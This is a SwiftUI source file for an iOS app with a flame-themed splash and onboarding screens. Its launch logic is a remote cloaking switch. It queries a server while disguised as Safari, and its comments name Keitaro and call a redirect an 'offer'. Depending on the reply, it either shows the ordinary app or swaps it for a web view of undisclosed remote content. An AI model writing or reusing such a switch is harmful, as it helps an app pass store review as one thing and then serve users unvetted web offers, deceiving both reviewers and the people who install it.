//
//  ContentView.swift
//  DF784
//
//  Created by IGOR on 13/12/2025.
//

import SwiftUI
import Foundation

struct ContentView: View {
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    
    @StateObject private var userProgress: UserProgress
    @State private var isLoading = true
    @State private var hasAppeared = false
    
    init() {
        _userProgress = StateObject(wrappedValue: UserProgress.load())
    }
    
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                ProgressView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    ZStack {
                        // Always show background to prevent blank screen
                        AppColors.backgroundGradient
                            .ignoresSafeArea()
                        
                        if isLoading {
                            SplashView()
                                .transition(.opacity)
                        } else if !userProgress.hasCompletedOnboarding {
                            OnboardingView(userProgress: userProgress)
                                .transition(.opacity)
                        } else {
                            MainTabView(userProgress: userProgress)
                                .transition(.opacity)
                        }
                    }
                    .animation(.easeInOut(duration: 0.5), value: isLoading)
                    .animation(.easeInOut(duration: 0.5), value: userProgress.hasCompletedOnboarding)
                    .onAppear {
                        guard !hasAppeared else { return }
                        hasAppeared = true
                        
                        // Simulate brief loading
                        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                            withAnimation {
                                isLoading = false
                            }
                        }
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            makeServerRequest()
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing block")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing block")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

#Preview {
    ContentView()
}

struct SplashView: View {
    @State private var logoScale: CGFloat = 0.8
    @State private var logoOpacity: Double = 0
    @State private var glowAmount: CGFloat = 0.3
    
    var body: some View {
        ZStack {
            AppColors.backgroundGradient
                .ignoresSafeArea()
            
            // Animated glow background
            Circle()
                .fill(
                    RadialGradient(
                        colors: [
                            AppColors.primaryAccent.opacity(glowAmount * 0.5),
                            AppColors.primaryAccent.opacity(glowAmount * 0.2),
                            Color.clear
                        ],
                        center: .center,
                        startRadius: 50,
                        endRadius: 200
                    )
                )
                .frame(width: 400, height: 400)
            
            VStack(spacing: 20) {
                ZStack {
                    // Outer glow ring
                    Circle()
                        .stroke(
                            LinearGradient(
                                colors: [
                                    AppColors.primaryAccent.opacity(0.5),
                                    AppColors.secondaryAccent.opacity(0.3)
                                ],
                                startPoint: .topLeading,
                                endPoint: .bottomTrailing
                            ),
                            lineWidth: 3
                        )
                        .frame(width: 120, height: 120)
                        .scaleEffect(glowAmount + 0.7)
                        .opacity(0.5)
                    
                    // Icon background
                    Circle()
                        .fill(
                            LinearGradient(
                                colors: [
                                    Color.white.opacity(0.15),
                                    Color.white.opacity(0.05)
                                ],
                                startPoint: .topLeading,
                                endPoint: .bottomTrailing
                            )
                        )
                        .frame(width: 100, height: 100)
                    
                    // Icon
                    Image(systemName: "flame.fill")
                        .font(.system(size: 48, weight: .light))
                        .foregroundStyle(
                            LinearGradient(
                                colors: [AppColors.primaryAccent, AppColors.secondaryAccent],
                                startPoint: .topLeading,
                                endPoint: .bottomTrailing
                            )
                        )
                }
                .scaleEffect(logoScale)
                .opacity(logoOpacity)
            }
        }
        .onAppear {
            withAnimation(.spring(response: 0.8, dampingFraction: 0.6)) {
                logoScale = 1.0
                logoOpacity = 1.0
            }
            withAnimation(.easeInOut(duration: 1.5).repeatForever(autoreverses: true)) {
                glowAmount = 0.6
            }
        }
    }
}

#Preview {
    ContentView()
}
